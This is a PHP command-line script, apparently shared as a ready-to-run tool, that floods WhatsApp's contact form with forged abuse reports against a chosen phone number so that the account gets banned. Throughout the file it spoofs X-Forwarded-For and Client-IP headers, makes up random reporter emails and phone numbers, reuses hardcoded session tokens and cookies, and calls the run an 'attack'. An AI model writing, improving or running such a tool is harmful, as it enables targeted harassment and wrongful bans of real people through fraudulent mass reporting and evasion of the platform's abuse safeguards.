<?php
// WhatsApp Ultimate Reporter Pro - PHP Version

// Configuration
define('WHATSAPP_API_URL', 'https://www.whatsapp.com/contact/noclient/async/new/');
define('REPORT_URL', 'https://faq.whatsapp.com/3379690015658337/?helpref=uf_share');
define('LOG_FILE', 'whatsapp_ultimate.log');
define('PHONES_DB', 'phones.db');
define('IPS_DB', 'ips.db');
define('BAN_MSG_FILE', 'message_ban_whatsapp.json');
define('UNBAN_MSG_FILE', 'message_unban_whatsapp.json');
define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36');

// Parameters from WhatsApp
define('AJAXPIPE_TOKEN', 'AXjVMTl_Wz4hIrAtZA8');
define('COMPAT_IFRAME_TOKEN', 'AUUBoz_O3X_0Wosk3O9XO8rS_NY');
define('BRSID', '7525697063073108760');
define('FB_LSD', 'AVpbkNjZYpw');
define('HSRP_REV', '1024646339');

// Colors for CLI
define('RED', "\033[0;31m");
define('GREEN', "\033[0;32m");
define('YELLOW', "\033[1;33m");
define('CYAN', "\033[0;36m");
define('BLUE', "\033[0;34m");
define('WHITE', "\033[1;37m");
define('NC', "\033[0m");

// Display banner
function showBanner() {
    echo GREEN;
    echo " _    _ _   _ _   _ _____ ___  ______   __ _____ _____ _____  \n";
    echo "| |  | | | | | \ | |_   _/ _ \|  _ \ \ / /|_   _|  ___|  ___| \n";
    echo "| |  | | | | |  \| | | || | | | |_) \ V /   | | | |__ | |__   \n";
    echo "| |/\| | | | | |\  | | || |_| |  _ < \ /    | | |  __||  __|  \n";
    echo "\  /\  / |_| | | \ |_| |_\___/|_| \_\| |    |_| | |___| |___  \n";
    echo " \/  \/ \___/|_|  \_\___/            |_|        |_|_____|_____| \n";
    echo NC;
    echo YELLOW . "WhatsApp Ultimate Reporter Pro - PHP Version" . NC . "\n";
    echo YELLOW . "===========================================" . NC . "\n";
    echo "Created by " . WHITE . ">>LORDHOZOO<<" . NC . " \n\n";
}

// Get random line from file
function getRandomLine($filename) {
    $lines = file($filename, FILE_IGNORE_NEW_LINES);
    return $lines[array_rand($lines)];
}

// Generate random email
function generateRandomEmail() {
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $length = 10;
    $randomName = '';
    for ($i = 0; $i < $length; $i++) {
        $randomName .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $randomName . '@gmail.com';
}

// Generate random phone number based on country
function generateRandomPhone($country) {
    switch ($country) {
        case 'ID': return '+62' . rand(1, 9) . str_pad(rand(0, 99999999), 8, '0', STR_PAD_LEFT);
        case 'EG': return '+20' . rand(1, 9) . str_pad(rand(0, 99999999), 8, '0', STR_PAD_LEFT);
        case 'US': return '+1' . str_pad(rand(0, 999999999), 9, '0', STR_PAD_LEFT);
        case 'KR': return '+82' . rand(1, 9) . str_pad(rand(0, 99999999), 8, '0', STR_PAD_LEFT);
        case 'CN': return '+86' . rand(1, 9) . str_pad(rand(0, 99999999), 8, '0', STR_PAD_LEFT);
        case 'IN': return '+91' . str_pad(rand(0, 999999999), 9, '0', STR_PAD_LEFT);
        default: return '0' . str_pad(rand(0, 999999999), 9, '0', STR_PAD_LEFT);
    }
}

// Send API request with WhatsApp parameters
function sendApiRequest($postData, $randomIp) {
    $headers = [
        'Host: www.whatsapp.com',
        'Cookie: wa_lang_pref=ar; wa_ul=f01bc326-4a06-4e08-82d9-00b74ae8e830; wa_csrf=HVi-YVV_BloLmh-WHL8Ufz',
        'Sec-Ch-Ua-Platform: "Linux"',
        'Accept-Language: en-US,en;q=0.9',
        'Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"',
        'Sec-Ch-Ua-Mobile: ?0',
        'X-Asbd-Id: 129477',
        'X-Fb-Lsd: ' . FB_LSD,
        'User-Agent: ' . USER_AGENT,
        'Content-Type: application/x-www-form-urlencoded',
        'Accept: */*',
        'Origin: https://www.whatsapp.com',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Dest: empty',
        'Referer: https://www.whatsapp.com/contact/noclient?',
        'Accept-Encoding: gzip, deflate, br',
        'X-Forwarded-For: ' . $randomIp,
        'Client-IP: ' . $randomIp
    ];

    // WhatsApp specific parameters
    $__hs = '20110.BP%3Awhatsapp_www_pkg.2.0.0.0.0';
    $__s = 'ugvlz3%3A6skj2s%3A4yux6k';
    $__hsi = rand(1000000000000000000, 9999999999999999999);
    $__req = number_format(0.1 + (mt_rand() / mt_getrandmax()) * (10 - 0.1), 6);
    $__a = rand(1, 1000000000);
    $__rev = HSRP_REV;
    $__dyn = '7xeUmwkHg7ebwKBAg5S1Dxu13wqovzEdEc8uxa1twYwJw4BwUx60Vo1upE4W0OE3nwaq0yE1VohwnU14E9k2C0iK0D82Ixe0EUjwdq1iwmE2ewnE2Lw5XwSyES0gq0Lo6-1Fw4mwr81UU7u1rwGwbu';
    $jazoest = '20000' . rand(10000, 99999);

    $postData .= "&__hs=$__hs&dpr=1&__ccg=UNKNOWN&__rev=$__rev&__s=$__s&__hsi=$__hsi&__dyn=$__dyn&__csr=&lsd=" . FB_LSD . "&jazoest=$jazoest";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, WHATSAPP_API_URL);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, USER_AGENT);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ['response' => $response, 'http_code' => $httpCode];
}

// Send report URL
function sendReportUrl($phoneNumber) {
    $reportUrl = REPORT_URL . '&phone=' . urlencode($phoneNumber);
    file_put_contents(LOG_FILE, "Report URL sent: $reportUrl\n", FILE_APPEND);
    echo YELLOW . "Sending report URL: " . NC . "$reportUrl\n";
    
    // Try to open in browser if possible
    if (PHP_OS_FAMILY === 'Windows') {
        exec("start $reportUrl");
    } elseif (PHP_OS_FAMILY === 'Linux') {
        exec("xdg-open '$reportUrl' > /dev/null 2>&1 &");
    } elseif (PHP_OS_FAMILY === 'Darwin') {
        exec("open '$reportUrl' > /dev/null 2>&1 &");
    }
}

// Perform the attack
function performAttack($numRequests, $delay, $targetNumber, $action) {
    $messages = json_decode(file_get_contents(BAN_MSG_FILE), true);
    if (empty($messages)) {
        echo RED . "No messages found in " . BAN_MSG_FILE . NC . "\n";
        return;
    }

    $countries = ['ID', 'ID', 'ID', 'EG', 'US', 'KR', 'CN', 'IN'];
    $platforms = ['ANDROID', 'IPHONE', 'WHATS_APP_WEB_DESKTOP', 'KAIOS', 'OTHER'];

    for ($i = 1; $i <= $numRequests; $i++) {
        $randomPhone = getRandomLine(PHONES_DB);
        $randomIp = getRandomLine(IPS_DB);
        $randomMessage = $messages[array_rand($messages)]['message'];
        $randomMessage = str_replace('[###]', $targetNumber, $randomMessage);
        $randomSubject = $messages[array_rand($messages)]['subject'];
        $countrySelector = $countries[array_rand($countries)];
        $platform = $platforms[array_rand($platforms)];
        $email = generateRandomEmail();
        $phoneNumber = generateRandomPhone($countrySelector);

        $postData = http_build_query([
            'country_selector' => $countrySelector,
            'email' => $email,
            'email_confirm' => $email,
            'phone_number' => $phoneNumber,
            'platform' => $platform,
            'your_message' => $randomSubject . '%A0' . $randomMessage,
            'step' => 'articles',
            '__user' => '0',
            '__a' => rand(1, 1000000000),
            '__req' => number_format(0.1 + (mt_rand() / mt_getrandmax()) * (10 - 0.1), 6)
        ]);

        $response = sendApiRequest($postData, $randomIp);

        // Log and display
        $logEntry = "Request: $i\nIP: $randomIp\nPhone: $randomPhone\nData: $postData\n";
        $logEntry .= "Response: {$response['response']}\nHTTP Code: {$response['http_code']}\n\n";
        file_put_contents(LOG_FILE, $logEntry, FILE_APPEND);

        if ($response['http_code'] == 200) {
            echo GREEN . "Success: " . WHITE . "Request $i - Target: $targetNumber - From: $randomIp" . NC . "\n";
        } else {
            echo RED . "Failed: " . WHITE . "Request $i - Status: {$response['http_code']}" . NC . "\n";
        }

        // Send report URL periodically
        if ($i % 5 == 0) {
            sendReportUrl($targetNumber);
        }

        sleep($delay);
    }

    // Final report URL
    sendReportUrl($targetNumber);
}

// Main function
function main() {
    showBanner();

    // Get target number
    while (true) {
        echo CYAN . "Enter target phone number (e.g. +628123456789): " . NC;
        $targetNumber = trim(fgets(STDIN));
        if (preg_match('/^\+[0-9]{10,15}$/', $targetNumber)) {
            break;
        }
        echo RED . "Invalid format. Example: +628123456789" . NC . "\n";
    }

    // Get action
    while (true) {
        echo CYAN . "Action (ban/unban): " . NC;
        $action = strtolower(trim(fgets(STDIN)));
        if (in_array($action, ['ban', 'unban'])) {
            break;
        }
        echo RED . "Enter 'ban' or 'unban'" . NC . "\n";
    }

    // Get requests count
    while (true) {
        echo CYAN . "Number of requests (1-1000): " . NC;
        $numRequests = intval(trim(fgets(STDIN)));
        if ($numRequests > 0 && $numRequests <= 1000) {
            break;
        }
        echo RED . "Enter number 1-1000" . NC . "\n";
    }

    // Get delay
    while (true) {
        echo CYAN . "Delay between requests (seconds): " . NC;
        $delay = intval(trim(fgets(STDIN)));
        if ($delay >= 1 && $delay <= 60) {
            break;
        }
        echo RED . "Enter 1-60 seconds" . NC . "\n";
    }

    // Confirm
    echo YELLOW . "Confirm attack on $targetNumber - $numRequests requests - $delay seconds delay" . NC . "\n";
    echo "Proceed? (y/n): ";
    $confirm = strtolower(trim(fgets(STDIN)));
    if ($confirm !== 'y') {
        exit(0);
    }

    // Execute
    performAttack($numRequests, $delay, $targetNumber, $action);
    echo GREEN . "Attack completed. Check " . LOG_FILE . " for details." . NC . "\n";
}

// Run
main();
